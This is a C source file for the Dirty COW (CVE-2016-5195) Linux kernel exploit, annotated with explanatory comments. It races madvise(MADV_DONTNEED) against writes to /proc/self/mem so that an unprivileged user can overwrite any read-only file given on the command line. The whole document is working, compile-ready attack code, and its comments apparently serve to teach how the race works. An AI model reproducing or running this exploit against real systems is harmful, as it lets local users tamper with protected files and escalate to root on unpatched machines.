#include <stdio.h>
#include <sys/mman.h>   // memory management declarations; mmap
#include <fcntl.h>      // abbreviation for file control; manipulates file
                        // descriptor
#include <pthread.h>    // threads
#include <unistd.h>
#include <sys/stat.h>   // defines the sturcture of the data returned by the
                        // functions fstat(), lstat(), and stat()
#include <string.h>
#include <stdint.h>     // integer types; uintptr_t

void *map;
int f;
struct stat st;
char *name;

void *madviseThread(void *arg)
{
    char *str;
    str = (char*) arg;
    int i, c=0;

    /*
     * You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/security/vulnerabilities/2706661
     * This is achieved by racing the madvise(MADV_DONTNEED) system call
     * while having the page of the executable mmapped in memory.
     */

    /*
     * MADV_DONTNEED - inform kernel that memory in the given range
     *                 (from map to the second parameter) will not be accessed
     *                 in the near future
     * 
     * madvise returns zero on success; -1 on errror
     */

    for(i = 0; i < 100000000; i++)
        c += madvise(map, 100, MADV_DONTNEED);

    printf("madvise %d\n\n",c);
}
 
void *procselfmemThread(void *arg)
{
    char *str;
    str = (char*) arg;
    
    /*
     * You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
     * The in the wild exploit we are aware of doesn't work on Red Hat
     * Enterprise Linux 5 and 6 out of the box because on one side of
     * the race it writes to /proc/self/mem, but /proc/self/mem is not
     * writable on Red Hat Enterprise Linux 5 and 6.
     */
    
    int f = open("/proc/self/mem", O_RDWR);
    int i, c=0;
    for(i = 0; i < 100000000; i++) {
        // You have to reset the file pointer to the memory position.
        lseek(f, (uintptr_t) map, SEEK_SET);
        c += write(f, str, strlen(str));
    }
    printf("procselfmem %d\n\n", c);
}
 
 
int main(int argc, char *argv[])
{
    // You have to pass two arguments. File and Contents.

    if (argc < 3) {
        fprintf(stderr, "%s\n", "usage: dirtyc0w target_file new_content");
        return 1;
    }

    pthread_t pth1, pth2;  // unsigned long int

    // You have to open the file in read only mode.
    f = open(argv[1], O_RDONLY);
    fstat(f, &st);
    name = argv[1];

    /*
     * You have to use MAP_PRIVATE for copy-on-write mapping.
     * Create a private copy-on-write mapping.  Updates to the
     * mapping are not visible to other processes mapping the same
     * file, and are not carried through to the underlying file.  It
     * is unspecified whether changes made to the file after the
     * mmap() call are visible in the mapped region.
     */

    // You have to open with PROT_READ.

    /*
     * PROT_READ    - Page can be read
     * PROT_WRITE   - Page can be written
     * PROT_EXEC    - Page can be executed
     * PROT_NONE    - Page cannot be accessed
     * 
     * MAP_SHARED   - Share changes
     * MAP_PRIVATE  - Changes are private
     * MAP_FIXED    - Interpret addr exactly
     */

    map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
    printf("mmap %zx\n\n", (uintptr_t) map);   // unsigned long int

    // You have to do it on two threads.
    pthread_create(&pth1, NULL, madviseThread, argv[1]);
    pthread_create(&pth2, NULL, procselfmemThread, argv[2]);

    // You have to wait for the threads to finish.
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);
    
    return 0;
}
